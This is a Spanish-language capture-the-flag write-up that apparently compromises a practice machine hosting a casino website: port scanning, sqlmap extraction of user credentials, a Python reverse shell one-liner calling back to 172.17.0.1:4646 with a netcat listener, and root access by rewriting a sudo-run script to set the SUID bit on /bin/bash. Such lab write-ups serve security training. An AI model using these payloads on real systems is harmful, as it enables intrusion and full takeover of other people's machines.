

Lo primero es hacer un escaneo de puertos y servicios con nmap.
![[Pasted image 20240810013800.png]]
Accedo al recurso, es una página de un casino, voy a la opción de Login y me encuentro un formulario.
![[Pasted image 20240810014001.png]]
Intento iniciar con unas credenciales admin admin para ver si puedo entrar.
![[Pasted image 20240810014111.png]]
Voy a realizar un poco de fuzzing web con gobuster.
![[Pasted image 20240810020742.png]]
No encuentro nada útil asique voy a intentar obtener la base de datos con sqlmap.
![[Pasted image 20240810021003.png]]
Primero voy a intentar obtener las bases de datos.
![[Pasted image 20240810021037.png]]
Ahora voy a intentar obtener las tablas de la base de datos users.
![[Pasted image 20240810021131.png]]
![[Pasted image 20240810021143.png]]
Lo siguiente es obtener las columnas de la tabla usuarios.
![[Pasted image 20240810021410.png]]
![[Pasted image 20240810021417.png]]
Para ver el contenido de las columnas.
![[Pasted image 20240810021527.png]]
![[Pasted image 20240810021533.png]]
Voy al formulario e inicio sesión como el usuario joe con la password MiClaveEsInhackeable.
![[Pasted image 20240810021651.png]]
Encuentro un panel de administración, lo que me hace pensar que joe es un administrador.
Veo que me pide que introduzca un comando Python.
Puedo leer archivos como el de los usuarios de la máquina.
![[Pasted image 20240810022150.png]]
Voy a intentar ejecutar una reverse shell para conseguir acceso al sistema.
Primero me pongo en escucha por el puerto 4646 utilizando netcat.
```
nc -lvnp 4646
```
Y luego ejecuto el comando.
![[Pasted image 20240810023548.png]]
```
import os,pty,socket;s=socket.socket();s.connect(("172.17.0.1",4646));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
```
Ahora haré el tratamiento de la TTY.
```bash
script /dev/null -c bash
Control + Z
stty raw -echo;fg
reset xterm
export TERM=xterm
export SHELL=bash
```
Voy a ver si hay algún archivo en el directorio /tmp que son archivos temporales.
![[Pasted image 20240810024550.png]]
Veo un archivo txt oculto, listo su contenido y son diferentes comandos de trucos del videojuego gta san andreas.
Lo importante es que hay un nuevo posible usuario llamado Martin, pero este usuario no se encuentra en el archivo /etc/passwd como vi anteriormente cuando lo listé desde el panel del administrador.
Voy a ver si puede ser posible que la contraseña de Joe o Luciano se encuentre en este .txt por lo que me lo voy a copiar y además como todas están en mayúsculas, voy a crear el mismo fichero pero con todas minúsculas.
En el archivo passwd.txt guardo las passwords en mayúsculas y en el passwd2.txt las minúsculas. 
![[Pasted image 20240810025816.png]]
Con el archivo con las contraseñas en mayúsculas no consigo nada sin embargo con el de las minúsculas y el usuario joe consigo las credenciales para acceder por ssh a la máquina.
![[Pasted image 20240810030103.png]]
Inicio sesión en ssh como joe.
![[Pasted image 20240810030124.png]]
Voy a intentar escalar privilegios.
Consigo ser el usuario Luciano gracias al siguiente binario.
![[Pasted image 20240810030452.png]]
En el directorio de Luciano, encuentro que puedo ejecutar como root un script.sh que me proporciona una reverse shell.
![[Pasted image 20240810030632.png]]
Tengo que cambiar el contenido para cambiar los permisos sobre el binario /bin/bash, pero antes un tratamiento de TTY.
```
script /dev/null -c bash
```
Ahora voy a modificar el contenido de la siguiente forma con el comando echo.
```bash
echo -e '#!/bin/bash\n\nchmod u+s /bin/bash' > script.sh
```
Para obtener una bash como root tengo que ejecutar el comando **bash -p**.
![[Pasted image 20240810032612.png]]
